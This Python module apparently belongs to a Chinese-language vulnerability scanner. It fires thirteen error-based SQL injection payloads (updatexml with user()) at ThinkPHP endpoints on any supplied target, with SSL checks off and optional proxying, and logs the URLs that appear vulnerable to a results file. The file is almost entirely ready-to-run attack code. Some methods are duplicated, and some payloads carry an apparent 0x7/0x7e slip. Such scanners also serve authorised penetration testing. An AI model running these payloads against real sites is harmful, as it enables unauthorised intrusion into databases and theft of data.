#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkSqlScan:

    def run(self, urls):
        try:
            url = urls + '/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass

    def run2(self,urls):
        try:
            url = urls + '/?id[where]=1 and updatexml(1,concat(0x7e,user(),0x7e),1) #'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run3(self, urls):
        try:
            url = urls + '/index/index/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)#'
            response = requests.get(url,headers=self.headers, verify=self.ssl, timeout=self.timeout, proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass

    def run4(self, urls):
        try:
            url = urls + '/index/index/index?username[0]=not like&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()#'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "@" in response.text and "username" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]可能存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"可能存在误判 {url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run5(self, urls):
        try:
            url = urls + '/public/index/test/index?order[id`,111)|updatexml(1,concat(0x3a,user()),1)%23][]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run6(self, urls):
        try:
            url = urls + '/index/index/index?username[0]=point&username[1]=1&username[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&username[3]=0'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run7(self, urls):
        try:
            url = urls + '/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run8(self, urls):
        try:
            url = urls + '/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run9(self, urls):
        try:
            url = urls + '/index/index/index?orderby[id`\|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run10(self, urls):
        try:
            url = urls + '/index/index/index?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run11(self, urls):
        try:
            url = urls + '/index/index/index?options=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run12(self, urls):
        try:
            url = urls + '/index/index/index?options=id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass
    def run13(self, urls):
        try:
            url = urls + '/?order[updatexml(1,concat(0x3a,user()),1)]=1'
            response = requests.get(url, headers=self.headers, verify=self.ssl, timeout=self.timeout,
                                    proxies=self.proxy)

            response.encoding = response.apparent_encoding
            if "XPATH" in response.text:
                # OutPrintInfo("DocCms", '[b bright_red]存在SQL注入 ')
                OutPrintInfo("ThinkPHP", f"[b bright_red]存在SQL注入 {url}")
                with open("./result/thinkphpSql.txt", "a") as w:
                    w.write(f"{url}\n")
            else:
                # OutPrintInfo("DocCms", '不存在存在SQL注入')
                pass
        except Exception:
            pass

    def main(self, target):
        # OutPrintInfo("DocCms", '开始检测SQL注入...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)
        self.headers = req["header"]
        self.proxy = {"http":proxy,"https":proxy}

        self.run(url)
        self.run2(url)
        self.run3(url)
        self.run4(url)
        self.run5(url)
        self.run6(url)
        self.run7(url)
        self.run8(url)
        self.run9(url)
        self.run10(url)
        self.run11(url)
        self.run12(url)
        self.run13(url)

        # OutPrintInfo("DocCms", 'SQL注入检测结束')